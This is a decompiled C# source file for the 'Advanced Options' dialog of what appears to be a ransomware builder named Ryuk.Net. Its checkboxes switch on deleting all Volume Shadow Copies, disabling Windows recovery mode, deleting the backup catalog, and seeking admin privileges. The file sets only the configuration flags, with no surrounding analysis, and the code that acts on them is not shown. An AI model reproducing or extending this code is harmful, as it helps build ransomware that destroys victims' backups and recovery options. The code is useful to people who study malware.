using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class advancedSettingForm : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components = null;

	private Panel panel1;

	private ButtonZ buttonZ1;

	private CheckBox deleteBackupCatalogCheckbox;

	private CheckBox disableRecoveryModeCheckbox;

	private CheckBox deleteShadowCopiesCheckbox;

	private CheckBox resistAdminCheckbox;

	private Label label1;

	public advancedSettingForm()
	{
		InitializeComponent();
	}

	private void advancedSettingForm_Load(object sender, EventArgs e)
	{
		if (Settings.Default.checkAdminPrivilage)
		{
			resistAdminCheckbox.set_Checked(true);
		}
		else
		{
			resistAdminCheckbox.set_Checked(false);
		}
	}

	private void buttonZ1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void buttonZ1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (resistAdminCheckbox.get_Checked())
		{
			Settings.Default.checkAdminPrivilage = true;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(true);
			((Control)disableRecoveryModeCheckbox).set_Enabled(true);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(true);
			deleteShadowCopiesCheckbox.set_Checked(true);
			disableRecoveryModeCheckbox.set_Checked(true);
			deleteBackupCatalogCheckbox.set_Checked(true);
		}
		else
		{
			Settings.Default.checkAdminPrivilage = false;
			((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
			((Control)disableRecoveryModeCheckbox).set_Enabled(false);
			((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
			deleteShadowCopiesCheckbox.set_Checked(false);
			disableRecoveryModeCheckbox.set_Checked(false);
			deleteBackupCatalogCheckbox.set_Checked(false);
		}
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - lastLocation.X + e.get_X(), ((Form)this).get_Location().Y - lastLocation.Y + e.get_Y()));
			((Control)this).Update();
		}
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.get_Location();
	}

	private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteShadowCopiesCheckbox.get_Checked())
		{
			Settings.Default.deleteShadowCopies = true;
		}
		else
		{
			Settings.Default.deleteShadowCopies = false;
		}
	}

	private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (deleteBackupCatalogCheckbox.get_Checked())
		{
			Settings.Default.deleteBackupCatalog = true;
		}
		else
		{
			Settings.Default.deleteBackupCatalog = false;
		}
	}

	private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
	{
		if (disableRecoveryModeCheckbox.get_Checked())
		{
			Settings.Default.disableRecoveryMode = true;
		}
		else
		{
			Settings.Default.disableRecoveryMode = false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Expected O, but got Unknown
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_01bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Expected O, but got Unknown
		//IL_05a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b3: Expected O, but got Unknown
		//IL_06d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e0: Expected O, but got Unknown
		//IL_06e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f2: Expected O, but got Unknown
		//IL_06fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0704: Expected O, but got Unknown
		panel1 = new Panel();
		label1 = new Label();
		buttonZ1 = new ButtonZ();
		deleteBackupCatalogCheckbox = new CheckBox();
		disableRecoveryModeCheckbox = new CheckBox();
		deleteShadowCopiesCheckbox = new CheckBox();
		resistAdminCheckbox = new CheckBox();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).get_Controls().Add((Control)(object)buttonZ1);
		((Control)panel1).get_Controls().Add((Control)(object)deleteBackupCatalogCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)disableRecoveryModeCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)deleteShadowCopiesCheckbox);
		((Control)panel1).get_Controls().Add((Control)(object)resistAdminCheckbox);
		((Control)panel1).set_Location(new Point(2, 1));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(274, 218));
		((Control)panel1).set_TabIndex(11);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)panel1).add_MouseDown(new MouseEventHandler(panel1_MouseDown));
		((Control)panel1).add_MouseMove(new MouseEventHandler(panel1_MouseMove));
		((Control)panel1).add_MouseUp(new MouseEventHandler(panel1_MouseUp));
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(10, 27));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(252, 31));
		((Control)label1).set_TabIndex(21);
		((Control)label1).set_Text("Advanced Options");
		((Control)buttonZ1).set_Anchor((AnchorStyles)9);
		buttonZ1.BZBackColor = Color.FromArgb(30, 30, 30);
		buttonZ1.DisplayText = "X";
		((ButtonBase)buttonZ1).set_FlatStyle((FlatStyle)0);
		((Control)buttonZ1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)buttonZ1).set_ForeColor(Color.White);
		((Control)buttonZ1).set_Location(new Point(243, 0));
		buttonZ1.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		buttonZ1.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)buttonZ1).set_Name("buttonZ1");
		((Control)buttonZ1).set_Size(new Size(31, 24));
		((Control)buttonZ1).set_TabIndex(20);
		((Control)buttonZ1).set_Text("X");
		buttonZ1.TextLocation_X = 6;
		buttonZ1.TextLocation_Y = 1;
		((ButtonBase)buttonZ1).set_UseVisualStyleBackColor(true);
		((Control)buttonZ1).add_Click((EventHandler)buttonZ1_Click_1);
		((Control)deleteBackupCatalogCheckbox).set_AutoSize(true);
		((Control)deleteBackupCatalogCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteBackupCatalogCheckbox).set_Enabled(false);
		((Control)deleteBackupCatalogCheckbox).set_ForeColor(Color.White);
		((Control)deleteBackupCatalogCheckbox).set_Location(new Point(46, 148));
		((Control)deleteBackupCatalogCheckbox).set_Name("deleteBackupCatalogCheckbox");
		((Control)deleteBackupCatalogCheckbox).set_Size(new Size(152, 17));
		((Control)deleteBackupCatalogCheckbox).set_TabIndex(19);
		((Control)deleteBackupCatalogCheckbox).set_Text("Delete the backup catalog");
		((ButtonBase)deleteBackupCatalogCheckbox).set_UseVisualStyleBackColor(true);
		deleteBackupCatalogCheckbox.add_CheckedChanged((EventHandler)deleteBackupCatalogCheckbox_CheckedChanged);
		((Control)disableRecoveryModeCheckbox).set_AutoSize(true);
		((Control)disableRecoveryModeCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)disableRecoveryModeCheckbox).set_Enabled(false);
		((Control)disableRecoveryModeCheckbox).set_ForeColor(Color.White);
		((Control)disableRecoveryModeCheckbox).set_Location(new Point(46, 183));
		((Control)disableRecoveryModeCheckbox).set_Name("disableRecoveryModeCheckbox");
		((Control)disableRecoveryModeCheckbox).set_Size(new Size(178, 17));
		((Control)disableRecoveryModeCheckbox).set_TabIndex(18);
		((Control)disableRecoveryModeCheckbox).set_Text("Disable windows recovery mode");
		((ButtonBase)disableRecoveryModeCheckbox).set_UseVisualStyleBackColor(true);
		disableRecoveryModeCheckbox.add_CheckedChanged((EventHandler)disableRecoveryModeCheckbox_CheckedChanged);
		((Control)deleteShadowCopiesCheckbox).set_AutoSize(true);
		((Control)deleteShadowCopiesCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)deleteShadowCopiesCheckbox).set_Enabled(false);
		((Control)deleteShadowCopiesCheckbox).set_ForeColor(Color.White);
		((Control)deleteShadowCopiesCheckbox).set_Location(new Point(46, 112));
		((Control)deleteShadowCopiesCheckbox).set_Name("deleteShadowCopiesCheckbox");
		((Control)deleteShadowCopiesCheckbox).set_Size(new Size(190, 17));
		((Control)deleteShadowCopiesCheckbox).set_TabIndex(17);
		((Control)deleteShadowCopiesCheckbox).set_Text("Delete all Volumes Shadow Copies");
		((ButtonBase)deleteShadowCopiesCheckbox).set_UseVisualStyleBackColor(true);
		deleteShadowCopiesCheckbox.add_CheckedChanged((EventHandler)deleteShadowCopiesCheckbox_CheckedChanged);
		((Control)resistAdminCheckbox).set_AutoSize(true);
		((Control)resistAdminCheckbox).set_Cursor(Cursors.get_Hand());
		((Control)resistAdminCheckbox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)resistAdminCheckbox).set_ForeColor(Color.White);
		((Control)resistAdminCheckbox).set_Location(new Point(30, 75));
		((Control)resistAdminCheckbox).set_Name("resistAdminCheckbox");
		((Control)resistAdminCheckbox).set_Size(new Size(212, 20));
		((Control)resistAdminCheckbox).set_TabIndex(16);
		((Control)resistAdminCheckbox).set_Text("Resist for admin privileges");
		((ButtonBase)resistAdminCheckbox).set_UseVisualStyleBackColor(true);
		resistAdminCheckbox.add_CheckedChanged((EventHandler)resistAdminCheckbox_CheckedChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(25, 25, 25));
		((Form)this).set_ClientSize(new Size(278, 221));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("advancedSettingForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("advancedSettingForm");
		((Form)this).add_Load((EventHandler)advancedSettingForm_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(advancedSettingForm_MouseDown));
		((Control)this).add_MouseMove(new MouseEventHandler(advancedSettingForm_MouseMove));
		((Control)this).add_MouseUp(new MouseEventHandler(advancedSettingForm_MouseUp));
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
